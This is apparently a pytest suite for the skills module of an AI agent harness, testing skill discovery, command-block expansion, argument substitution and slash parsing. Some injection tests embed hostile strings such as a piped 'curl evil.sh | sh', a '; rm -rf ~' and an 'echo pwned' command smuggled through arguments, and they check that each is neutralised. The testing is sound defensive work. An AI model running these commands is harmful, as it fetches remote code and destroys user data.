import shlex
from pathlib import Path

from harness.skills import (
    Skill,
    cmd_blocks,
    discover,
    expand_body,
    has_cmd_blocks,
    parse_slash,
    shell_substitute_args,
    skill_tool,
    skills_section,
    substitute_args,
    view_skill_tool,
)


def write_skill(skills_dir, name, description, body):
    skills_dir.mkdir(exist_ok=True)
    (skills_dir / f"{name}.md").write_text(
        f"---\nname: {name}\ndescription: {description}\n---\n{body}"
    )


def write_dir_skill(skills_dir, dirname, name, description, body, files=None):
    d = skills_dir / dirname
    d.mkdir(parents=True, exist_ok=True)
    (d / "SKILL.md").write_text(
        f"---\nname: {name}\ndescription: {description}\n---\n{body}"
    )
    for relpath, content in (files or {}).items():
        f = d / relpath
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(content)
    return d


def test_discover_parses_frontmatter_and_body(tmp_path):
    write_skill(tmp_path, "commit-style", "how to write commits", "Use imperative mood.")
    (skill,) = discover(tmp_path)
    assert skill.name == "commit-style"
    assert skill.description == "how to write commits"
    assert skill.body.strip() == "Use imperative mood."


def test_discover_is_empty_for_a_missing_or_empty_dir(tmp_path):
    assert discover(tmp_path / "absent") == []
    (tmp_path / "empty").mkdir()
    assert discover(tmp_path / "empty") == []


def test_a_malformed_skill_is_skipped_with_a_warning(tmp_path):
    tmp_path.mkdir(exist_ok=True)
    (tmp_path / "broken.md").write_text("no frontmatter here")
    write_skill(tmp_path, "good", "a valid one", "Body.")
    warnings = []
    skills = discover(tmp_path, on_warning=warnings.append)
    assert [s.name for s in skills] == ["good"]
    assert warnings and "broken.md" in warnings[0]


def test_discovery_is_sorted_by_name(tmp_path):
    write_skill(tmp_path, "zebra", "z", "z")
    write_skill(tmp_path, "alpha", "a", "a")
    assert [s.name for s in discover(tmp_path)] == ["alpha", "zebra"]


def test_section_lists_metadata_only_never_bodies(tmp_path):
    write_skill(tmp_path, "commit-style", "how to write commits", "SECRET BODY TEXT")
    section = skills_section(discover(tmp_path))
    assert "commit-style" in section
    assert "how to write commits" in section
    assert "SECRET BODY TEXT" not in section  # progressive disclosure


def test_no_skills_means_no_section(tmp_path):
    assert skills_section([]) is None


def test_section_names_the_registered_tool(tmp_path):
    write_skill(tmp_path, "s", "d", "b")
    skills = discover(tmp_path)
    assert "call the skill tool" in skills_section(skills)              # main-loop default
    assert "call the view_skill tool" in skills_section(skills, "view_skill")  # ui lane


def test_cmd_blocks_extracts_commands_in_order():
    assert cmd_blocks("a !`one` b !`two`") == ["one", "two"]


def test_cmd_blocks_excludes_an_escaped_command():
    # the session gate must not list a literal the skill only documents
    assert cmd_blocks(r"a \!`one` b !`two`") == ["two"]


def test_cmd_blocks_is_empty_for_an_escaped_only_body():
    assert cmd_blocks(r"docs: \!`git diff`") == []


def test_has_cmd_blocks_detects_presence():
    assert has_cmd_blocks("x !`pwd` y") is True
    assert has_cmd_blocks("plain prose, no blocks") is False


def test_has_cmd_blocks_is_false_for_an_escaped_only_body():
    # an escaped-only body needs no execution approval — it runs nothing
    assert has_cmd_blocks(r"docs: \!`git diff`") is False


def _noop(cmd):  # a run that is never called (bodies here have no !`cmd`)
    raise AssertionError(f"run should not have been called, got {cmd!r}")


def test_skill_returns_the_full_body(tmp_path):
    write_skill(tmp_path, "commit-style", "how to write commits", "Use imperative mood.")
    tool = skill_tool(discover(tmp_path), run=_noop)
    assert "Use imperative mood." in tool.execute(name="commit-style")


def test_skill_tool_with_run_is_still_read_only(tmp_path):
    # the tool call only injects preprocessed text; a body's !`cmd` blocks are
    # session-approved config shell, not something this call governs
    write_skill(tmp_path, "x", "d", "b")
    assert skill_tool(discover(tmp_path), run=_noop).read_only is True


def test_skill_tool_with_run_none_is_read_only_and_returns_body_verbatim(tmp_path):
    write_skill(tmp_path, "x", "d", "body with !`echo hi` inside")
    tool = skill_tool(discover(tmp_path))
    assert tool.read_only is True
    assert tool.execute(name="x") == "body with !`echo hi` inside"


def test_view_skill_tool_preserves_the_lesson15_contract(tmp_path):
    # the ui lane keys on this tool: name "view_skill", read-only, usable in
    # subagents (spawns_subagents False), returns the body without executing
    write_skill(tmp_path, "x", "d", "body with !`echo hi` inside")
    tool = view_skill_tool(discover(tmp_path))
    assert tool.name == "view_skill"
    assert tool.read_only is True
    assert tool.spawns_subagents is False
    assert tool.execute(name="x") == "body with !`echo hi` inside"  # not run


def test_skill_on_an_unknown_name_lists_what_exists(tmp_path):
    write_skill(tmp_path, "commit-style", "d", "b")
    write_skill(tmp_path, "review-style", "d", "b")
    result = skill_tool(discover(tmp_path), run=_noop).execute(name="nope")
    assert result.startswith("Error")
    assert "commit-style" in result and "review-style" in result


def test_skill_injects_command_output_at_invocation(tmp_path):
    write_skill(tmp_path, "ctx", "gathers context", "user is !`whoami` now")
    tool = skill_tool(discover(tmp_path), run=lambda cmd: f"[{cmd}]")
    assert tool.execute(name="ctx") == "user is [whoami] now"


def test_skill_executes_a_real_command_through_the_sandbox_runner(tmp_path):
    from harness.tools.bash import run_sandboxed
    from harness.sandbox import NoSandbox

    write_skill(tmp_path, "greet", "greets", "says: !`echo tester`")
    tool = skill_tool(discover(tmp_path), run=lambda cmd: run_sandboxed(cmd, NoSandbox()))
    out = tool.execute(name="greet")
    assert "tester" in out
    assert "exit code: 0" in out


def test_frontmatter_tolerates_blank_lines_and_comments(tmp_path):
    tmp_path.mkdir(exist_ok=True)
    (tmp_path / "s.md").write_text(
        "---\nname: s\n\n# a note\ndescription: d\n---\nBody."
    )
    (skill,) = discover(tmp_path)
    assert skill.name == "s" and skill.description == "d"


def test_triple_dash_inside_a_value_is_not_a_delimiter(tmp_path):
    tmp_path.mkdir(exist_ok=True)
    (tmp_path / "s.md").write_text(
        "---\nname: s\ndescription: use --- to separate\n---\nReal body."
    )
    (skill,) = discover(tmp_path)
    assert skill.description == "use --- to separate"
    assert skill.body == "Real body."


def test_a_bom_prefixed_file_still_parses(tmp_path):
    tmp_path.mkdir(exist_ok=True)
    (tmp_path / "s.md").write_bytes(
        b"\xef\xbb\xbf---\nname: s\ndescription: d\n---\nBody."
    )
    assert [s.name for s in discover(tmp_path)] == ["s"]


def test_non_ascii_content_loads(tmp_path):
    write_skill(tmp_path, "s", "uses an em dash — like this", "Body — with punctuation.")
    (skill,) = discover(tmp_path)
    assert "—" in skill.description


def test_duplicate_names_keep_the_first_and_warn(tmp_path):
    tmp_path.mkdir(exist_ok=True)
    (tmp_path / "a.md").write_text("---\nname: dup\ndescription: first\n---\nA")
    (tmp_path / "b.md").write_text("---\nname: dup\ndescription: second\n---\nB")
    warnings = []
    skills = discover(tmp_path, on_warning=warnings.append)
    assert len(skills) == 1 and skills[0].body == "A"  # a.md sorts first
    assert warnings and "duplicate" in warnings[0]


def test_discovery_order_follows_names_not_filenames(tmp_path):
    tmp_path.mkdir(exist_ok=True)
    (tmp_path / "zzz.md").write_text("---\nname: aaa\ndescription: d\n---\nx")
    (tmp_path / "mmm.md").write_text("---\nname: mmm\ndescription: d\n---\nx")
    assert [s.name for s in discover(tmp_path)] == ["aaa", "mmm"]


def test_expand_body_substitutes_command_output():
    out = expand_body("diff:\n!`git diff`", run=lambda cmd: f"<{cmd}>")
    assert out == "diff:\n<git diff>"


def test_expand_body_substitutes_every_block():
    out = expand_body("!`a` and !`b`", run=lambda cmd: cmd.upper())
    assert out == "A and B"


def test_expand_body_leaves_a_body_without_blocks_unchanged():
    body = "just prose, no bang-backtick here"
    assert expand_body(body, run=lambda cmd: "X") == body


def test_expand_body_ignores_a_bare_code_span_and_bare_bang():
    body = "a `code span` and a bare ! and !not-a-block"
    assert expand_body(body, run=lambda cmd: "RAN") == body  # no !`...` pattern


def test_expand_body_turns_a_failing_run_into_an_inline_marker():
    def boom(cmd):
        raise RuntimeError("sandbox down")

    out = expand_body("!`whoami`", run=boom)
    assert out == "[skill command failed: sandbox down]"


def test_expand_body_treats_an_escaped_bang_as_a_literal_and_never_calls_run():
    out = expand_body(r"docs: \!`git diff`", run=_noop)
    assert out == "docs: !`git diff`"


def test_expand_body_lookbehind_prevents_a_code_spans_bang_from_matching_into_later_backticks():
    # without the (?<!`) lookbehind, "!" inside `!` reads on into the next
    # code span's backtick as if " key opens " were the command
    body = "the `!` key opens `settings`"
    assert expand_body(body, run=_noop) == body


def test_expand_body_does_not_match_an_empty_command():
    body = "nothing to run: !``"
    assert expand_body(body, run=_noop) == body


def test_expand_body_does_not_execute_a_bang_ending_a_code_span():
    # a bang glued to the end of an inline-code span, with a later code span,
    # must NOT read the text between them as a command
    body = "Run the `foo!` command, then check `bar`."
    assert expand_body(body, run=_noop) == body


def test_expand_body_does_not_match_bang_bang_inside_a_code_span():
    body = "press `!!` twice then run `code`"
    assert expand_body(body, run=_noop) == body


def test_expand_body_requires_a_token_boundary_before_the_bang():
    # a bang glued to a word is prose, not a command
    body = "excited about foo!`bar` today"
    assert expand_body(body, run=_noop) == body


def test_expand_body_escape_is_not_defeated_by_a_preceding_backtick():
    # a backtick immediately before the escape must not re-enable execution
    body = r"see `\!`git diff`"
    assert expand_body(body, run=_noop) == body  # unchanged: run never called


def test_discover_reads_a_directory_skill(tmp_path):
    write_dir_skill(tmp_path, "pdf", "pdf", "work with pdfs", "Body.")
    (skill,) = discover(tmp_path)
    assert skill.name == "pdf"
    assert skill.body == "Body."
    assert skill.dir == tmp_path / "pdf"


def test_flat_skill_dir_is_the_skills_root(tmp_path):
    write_skill(tmp_path, "commit-style", "d", "Body.")
    (skill,) = discover(tmp_path)
    assert skill.dir == tmp_path


def test_discover_reads_flat_and_directory_skills_together(tmp_path):
    write_skill(tmp_path, "flat", "d", "flat body")
    write_dir_skill(tmp_path, "deep", "deep", "d", "dir body")
    assert [s.name for s in discover(tmp_path)] == ["deep", "flat"]


def test_a_directory_without_skill_md_is_ignored(tmp_path):
    (tmp_path / "notaskill").mkdir()
    (tmp_path / "notaskill" / "readme.txt").write_text("nothing here")
    write_dir_skill(tmp_path, "real", "real", "d", "b")
    assert [s.name for s in discover(tmp_path)] == ["real"]


def test_a_md_named_directory_without_skill_md_warns(tmp_path):
    (tmp_path / "typo.md").mkdir()  # a dir named like a flat skill, no SKILL.md
    write_skill(tmp_path, "good", "d", "b")
    warnings = []
    skills = discover(tmp_path, on_warning=warnings.append)
    assert [s.name for s in skills] == ["good"]
    assert warnings and "typo.md" in warnings[0]


def test_directory_name_and_frontmatter_name_may_differ(tmp_path):
    write_dir_skill(tmp_path, "tools", "pdf", "d", "b")  # dir 'tools', name 'pdf'
    (skill,) = discover(tmp_path)
    assert skill.name == "pdf"
    assert skill.dir == tmp_path / "tools"


def test_skill_dir_is_substituted_at_expansion(tmp_path):
    write_dir_skill(tmp_path, "pdf", "pdf", "d", "schema: ${SKILL_DIR}/references/api.md")
    out = skill_tool(discover(tmp_path)).execute(name="pdf")
    assert "${SKILL_DIR}" not in out
    assert out == f"schema: {tmp_path / 'pdf'}/references/api.md"


def test_command_approval_listing_shows_the_skill_dir_token(tmp_path):
    write_dir_skill(tmp_path, "pdf", "pdf", "d", "run: !`python ${SKILL_DIR}/check.py`")
    (skill,) = discover(tmp_path)
    # ${SKILL_DIR} resolves at expansion now, so the listing shows the template
    # token (the skill's own dir — safe, not model-controlled)
    assert cmd_blocks(skill.body) == ["python ${SKILL_DIR}/check.py"]


def test_flat_skill_dir_resolves_to_the_skills_root(tmp_path):
    write_skill(tmp_path, "s", "d", "here: ${SKILL_DIR}/x")
    assert skill_tool(discover(tmp_path)).execute(name="s") == f"here: {tmp_path}/x"


def test_skill_dir_in_prose_is_not_shell_quoted_even_with_a_space(tmp_path):
    # the round-2 regression: a spaced install path must NOT put literal quotes
    # into a prose path, or the model relays a broken path to read_file
    d = tmp_path / "My Skills"
    d.mkdir()
    write_dir_skill(d, "pdf", "pdf", "d", "See ${SKILL_DIR}/ref.md")
    assert skill_tool(discover(d)).execute(name="pdf") == f"See {d / 'pdf'}/ref.md"


def test_view_skill_resolves_the_skill_dir_raw(tmp_path):
    write_dir_skill(tmp_path, "pdf", "pdf", "d", "ref: ${SKILL_DIR}/x")
    assert view_skill_tool(discover(tmp_path)).execute(name="pdf") == f"ref: {tmp_path / 'pdf'}/x"


def test_substitute_args_arguments_and_positionals():
    assert substitute_args("all=$ARGUMENTS first=$1 third=$3", "a b") == "all=a b first=a third="


def test_substitute_args_fills_a_positional_inside_a_command():
    assert substitute_args("!`git log $1`", "HEAD") == "!`git log HEAD`"


def test_discover_warns_on_a_misspelled_allowed_tools_key(tmp_path):
    # 'allowed_tools' (underscore) reads as absent → allowed_tools stays None,
    # which WIDENS a fork skill to the full registry; warn instead of silence
    (tmp_path / "r").mkdir()
    (tmp_path / "r" / "SKILL.md").write_text(
        "---\nname: r\ndescription: d\ncontext: fork\nallowed_tools: read_file\n---\nBody."
    )
    warnings = []
    (skill,) = discover(tmp_path, on_warning=warnings.append)
    assert skill.allowed_tools is None
    assert any("allowed_tools" in w for w in warnings)


def test_discover_warns_on_empty_allowed_tools(tmp_path):
    (tmp_path / "r").mkdir()
    (tmp_path / "r" / "SKILL.md").write_text(
        "---\nname: r\ndescription: d\ncontext: fork\nallowed-tools:\n---\nBody."
    )
    warnings = []
    (skill,) = discover(tmp_path, on_warning=warnings.append)
    assert skill.allowed_tools == []
    assert any("empty allowed-tools" in w for w in warnings)


def test_discover_warns_when_context_is_not_exactly_fork(tmp_path):
    (tmp_path / "r").mkdir()
    (tmp_path / "r" / "SKILL.md").write_text(
        "---\nname: r\ndescription: d\ncontext: Fork\n---\nBody."
    )
    warnings = []
    (skill,) = discover(tmp_path, on_warning=warnings.append)
    assert skill.fork is False  # a case typo degrades to a plain skill...
    assert any("not 'fork'" in w for w in warnings)  # ...but no longer silently


def test_skill_dir_with_a_space_stays_shell_safe(tmp_path):
    d = tmp_path / "My Skills"
    d.mkdir()
    write_skill(d, "s", "d", "run: !`cat ${SKILL_DIR}/x`")
    ran = []
    tool = skill_tool(discover(d), run=lambda cmd: ran.append(cmd) or "ok")
    tool.execute(name="s")
    # the quoted path is a single shell token even though it contains a space
    assert ran == [f"cat {shlex.quote(str(d))}/x"]


def test_discover_reads_fork_model_and_allowed_tools(tmp_path):
    # frontmatter written directly to control the fork/model/allowed-tools keys
    (tmp_path / "research").mkdir()
    (tmp_path / "research" / "SKILL.md").write_text(
        "---\nname: research\ndescription: d\ncontext: fork\n"
        "model: gpt-5.4-mini\nallowed-tools: read_file list_dir\n---\nBody."
    )
    (skill,) = discover(tmp_path)
    assert skill.fork is True
    assert skill.model == "gpt-5.4-mini"
    assert skill.allowed_tools == ["read_file", "list_dir"]


def test_discover_warns_when_a_skill_is_named_plan(tmp_path):
    # 'plan' collides with the /plan built-in, so it's unreachable via slash
    write_skill(tmp_path, "plan", "d", "b")
    warnings = []
    (skill,) = discover(tmp_path, on_warning=warnings.append)
    assert skill.name == "plan"  # still loaded (the model can call it by name)
    assert any("shadowed by the /plan" in w for w in warnings)


def test_discover_survives_an_unreadable_skills_directory(tmp_path, monkeypatch):
    # an unreadable skills dir must degrade to zero skills with a warning, not
    # crash the session at startup (the "never fatal" invariant glob() had)
    d = tmp_path / "skills"
    d.mkdir()

    def boom(self):
        raise PermissionError("permission denied")

    monkeypatch.setattr(Path, "iterdir", boom)
    warnings = []
    assert discover(d, on_warning=warnings.append) == []
    assert warnings and "permission denied" in warnings[0]


def test_discover_keeps_a_plain_skill_but_ignores_its_model(tmp_path):
    # model is meaningless on a non-fork skill: don't drop the skill over it
    (tmp_path / "bad").mkdir()
    (tmp_path / "bad" / "SKILL.md").write_text(
        "---\nname: bad\ndescription: d\nmodel: gpt-9-imaginary\n---\nBody."
    )
    write_skill(tmp_path, "good", "d", "b")
    warnings = []
    skills = discover(tmp_path, on_warning=warnings.append)
    assert sorted(s.name for s in skills) == ["bad", "good"]  # kept, not dropped
    assert next(s for s in skills if s.name == "bad").model is None
    assert any("ignored" in w for w in warnings)


def test_discover_skips_a_fork_skill_with_an_unknown_model(tmp_path):
    # a fork skill NEEDS a real model to build its client, so a bad one is fatal
    (tmp_path / "bad").mkdir()
    (tmp_path / "bad" / "SKILL.md").write_text(
        "---\nname: bad\ndescription: d\ncontext: fork\nmodel: gpt-9-imaginary\n---\nBody."
    )
    write_skill(tmp_path, "good", "d", "b")
    warnings = []
    skills = discover(tmp_path, on_warning=warnings.append)
    assert [s.name for s in skills] == ["good"]
    assert any("gpt-9-imaginary" in w for w in warnings)


def test_a_plain_skill_has_no_fork_or_policy(tmp_path):
    write_skill(tmp_path, "plain", "d", "b")
    (skill,) = discover(tmp_path)
    assert skill.fork is False and skill.model is None and skill.allowed_tools is None


def test_skill_tool_substitutes_args_when_injecting(tmp_path):
    write_skill(tmp_path, "greet", "d", "hello $1, args=$ARGUMENTS")
    tool = skill_tool(discover(tmp_path))
    assert tool.execute(name="greet", args="world x") == "hello world, args=world x"


def test_skill_tool_forks_and_returns_the_subagent_answer(tmp_path):
    (tmp_path / "r").mkdir()
    (tmp_path / "r" / "SKILL.md").write_text(
        "---\nname: r\ndescription: d\ncontext: fork\nmodel: gpt-5.4-mini\n"
        "allowed-tools: read_file\n---\nresearch $1"
    )
    calls = {}
    def fake_fork(task, model, allowed_tools):
        calls.update(task=task, model=model, allowed_tools=allowed_tools)
        return "SUBAGENT ANSWER"
    tool = skill_tool(discover(tmp_path), fork_run=fake_fork)
    out = tool.execute(name="r", args="pdfs")
    assert out == "SUBAGENT ANSWER"
    assert calls == {"task": "research pdfs", "model": "gpt-5.4-mini", "allowed_tools": ["read_file"]}


def test_skill_tool_is_read_only_and_bars_nested_fork(tmp_path):
    write_skill(tmp_path, "x", "d", "b")
    t = skill_tool(discover(tmp_path))
    assert t.read_only is True and t.spawns_subagents is True


def test_a_fork_skill_without_fork_run_reports_an_error(tmp_path):
    (tmp_path / "r").mkdir()
    (tmp_path / "r" / "SKILL.md").write_text(
        "---\nname: r\ndescription: d\ncontext: fork\n---\nBody."
    )
    tool = skill_tool(discover(tmp_path))  # no fork_run
    assert tool.execute(name="r").startswith("Error")


def test_args_cannot_introduce_a_command_into_a_prose_skill(tmp_path):
    write_skill(tmp_path, "notes", "d", "Notes: $ARGUMENTS")
    ran = []
    tool = skill_tool(discover(tmp_path), run=lambda cmd: ran.append(cmd) or "RAN")
    out = tool.execute(name="notes", args="!`echo pwned`")
    assert ran == []                       # nothing executed
    assert out == "Notes: !`echo pwned`"   # the injection is inert prose


def test_args_fill_an_approved_template_command(tmp_path):
    write_skill(tmp_path, "log", "d", "log:\n!`git log $1`")
    tool = skill_tool(discover(tmp_path), run=lambda cmd: f"<{cmd}>")
    assert tool.execute(name="log", args="HEAD") == "log:\n<git log HEAD>"


def test_shell_substitute_args_quotes_metacharacters_in_a_command():
    # args that reach sh -c are shlex.quote'd: a ';'-chained payload is passed
    # as literal data, not interpreted — the injection the review found
    cmd = shell_substitute_args("git log $ARGUMENTS", "; curl evil.sh | sh")
    assert cmd == "git log ';' curl evil.sh '|' sh"  # ';' and '|' quoted; '.' is shell-safe
    # multi-token flag args survive: each token is a separate, inert argument
    assert shell_substitute_args("git log $ARGUMENTS", "--oneline -n 5") == (
        "git log --oneline -n 5"
    )
    # a missing positional expands to nothing, like substitute_args
    assert shell_substitute_args("diff $1 $2", "HEAD") == "diff HEAD "


def test_args_cannot_inject_shell_operators_into_a_running_command(tmp_path):
    # end to end: a metachar payload in args reaches the run callback quoted,
    # so the shell would receive it as literal text, never a second command
    write_skill(tmp_path, "log", "d", "!`git log $ARGUMENTS`")
    ran = []
    tool = skill_tool(discover(tmp_path), run=lambda cmd: ran.append(cmd) or "ok")
    tool.execute(name="log", args="; rm -rf ~")
    assert ran == ["git log ';' rm -rf '~'"]  # the ';' is a quoted literal, not a chain


def test_args_injected_command_is_inert_even_beside_a_real_one(tmp_path):
    write_skill(tmp_path, "x", "d", "a= !`echo one` b=$1")
    ran = []
    tool = skill_tool(discover(tmp_path), run=lambda cmd: ran.append(cmd) or f"[{cmd}]")
    out = tool.execute(name="x", args="!`echo-two`")
    assert ran == ["echo one"]             # only the template's command ran
    assert out == "a= [echo one] b=!`echo-two`"


def test_parse_slash_name_and_args():
    assert parse_slash("/commit-style HEAD") == ("commit-style", "HEAD")


def test_parse_slash_name_only():
    assert parse_slash("/x") == ("x", "")


def test_parse_slash_args_is_remainder_after_first_space():
    assert parse_slash("/x  a b  ") == ("x", "a b")


def test_parse_slash_splits_the_name_on_any_whitespace():
    # a tab after the name must not glue into the name (which would make
    # '/plan\ttask' fall through to the model as an ordinary, acting turn)
    assert parse_slash("/plan\tinvestigate the bug") == ("plan", "investigate the bug")


def test_parse_slash_name_is_the_first_token_only():
    assert parse_slash("/write a poem") == ("write", "a poem")


def test_parse_slash_bare_slash_is_none():
    assert parse_slash("/") is None
    assert parse_slash("/   ") is None


def test_parse_slash_non_slash_is_none():
    assert parse_slash("not a command") is None
    assert parse_slash("") is None
